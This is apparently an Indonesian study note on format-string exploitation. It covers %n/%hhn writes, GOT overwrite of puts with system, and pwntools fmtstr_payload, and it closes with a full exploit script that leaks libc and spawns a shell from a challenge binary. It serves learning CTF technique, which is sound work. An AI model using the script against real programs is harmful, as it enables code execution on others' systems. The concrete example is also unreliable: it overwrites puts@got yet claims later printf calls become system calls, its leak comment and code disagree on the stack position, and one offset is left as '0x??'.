#cybersecurity

`%n` menulis **jumlah karakter yang sudah dicetak** ke alamat yang ditunjuk argumen. Dengan mengontrol jumlah karakter dan alamat target, kita bisa **menulis byte apa pun ke memory mana pun** - biasanya ke GOT untuk mengubah arah panggilan fungsi.

## Cara kerja %n

```c
printf("AAAA%n", &x);   // x = 4 (jumlah char "AAAA")
```

- `%n` → tulis 4 byte
- `%hn` → tulis 2 byte
- `%hhn` → tulis 1 byte (paling presisi)

## Konsep: GOT overwrite

Panggilan `puts(x)` memakai `puts@got` untuk mencari alamat puts di libc. Kalau isi `puts@got` kita ganti dengan `system`:

```text
puts@got = system
maka: puts("/bin/sh")  ->  system("/bin/sh")
```

## Menyusun payload

Target: tulis alamat `system` (misal `0x7f1234567890`) ke `puts@got`.

### Langkah 1 - taruh alamat target di payload

```python
payload = p64(puts_got)          # alamat yang akan ditulis
payload += b"%6$hhn"             # tulis 1 byte ke puts_got
```

Tapi `%hhn` menulis **jumlah karakter** - kita harus mencetak tepat `0x90` karakter dulu. Itu mahal (banyak padding).

### Langkah 2 - teknik byte-by-byte (paling umum)

Tulis 1 byte per target, 4-8 target sekaligus (untuk alamat 4-8 byte):

```python
from pwn import *

# posisi payload di format string (dari penanda AAAA)
pos = 6

# alamat target & nilai yang mau ditulis
puts_got = elf.got.puts
system   = libc.sym.system   # misal 0x7f1234567890

# pecah alamat system jadi byte
bytes_to_write = [system & 0xff, (system >> 8) & 0xff, ...]

payload = b""
# taruh semua alamat target di depan
for i in range(6):
    payload += p64(puts_got + i)

# lalu specifier %hhn untuk tiap byte
# hitung jumlah karakter yang harus dicetak supaya %hhn menulis nilai yang benar
```

### Langkah 3 - gunakan pwntools fmtstr_payload

Ini yang paling praktis:

```python
from pwn import *

# fmtstr_payload(posisi_offset, {alamat_target: nilai})
payload = fmtstr_payload(6, {elf.got.puts: libc.sym.system})

io.sendline(payload)
# sekarang panggil puts("/bin/sh") -> system("/bin/sh")
```

pwntools otomatis menghitung padding & `%hhn` untuk menulis nilai persis.

## Contoh alur lengkap

```
1. Leak libc (dari format string / bug lain) -> system
2. system = libc.address + offset_system
3. payload = fmtstr_payload(pos, {puts_got: system})
4. kirim payload
5. kirim input yang memanggil puts dengan argumen "/bin/sh"
   (misal program punya fungsi yang printf(isi_input) -> setelah GOT di-overwrite,
    memanggil puts(isi_input) = system(isi_input), kirim "/bin/sh")
6. shell!
```

## Contoh konkret (program memanggil printf(user_input) dua kali)

```python
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./chall")

# 1. leak libc lewat %p (posisi 6 berisi return address / alamat libc)
io.sendline(b"%7$p")          # cari posisi yang berisi alamat libc
leak = int(io.recvline(), 16)
libc.address = leak - 0x??    # kurangi offset sesuai isi posisi tsb

# 2. GOT overwrite puts -> system
payload = fmtstr_payload(6, {elf.got.puts: libc.sym.system})
io.sendline(payload)

# 3. sekarang printf(user) = puts(user) = system(user)
io.sendline(b"/bin/sh")
io.interactive()
```

## Catatan

1. `%n` hanya jalan kalau target writable - `puts@got` writable hanya kalau **Partial RELRO** (lihat [[RELRO]]).
2. Format string panjang → batasi dengan `%hhn` (1 byte) supaya padding tidak gila-gilaan.
3. `fmtstr_payload` butuh **posisi offset** yang benar - temukan dengan penanda `AAAA%p...`.
4. Kalau ada dua panggilan format (satu untuk leak, satu untuk write), alur di atas langsung bisa.
5. `fmtstr_payload(offset, writes, write_size="byte")` default pakai `%hhn` - paling aman.
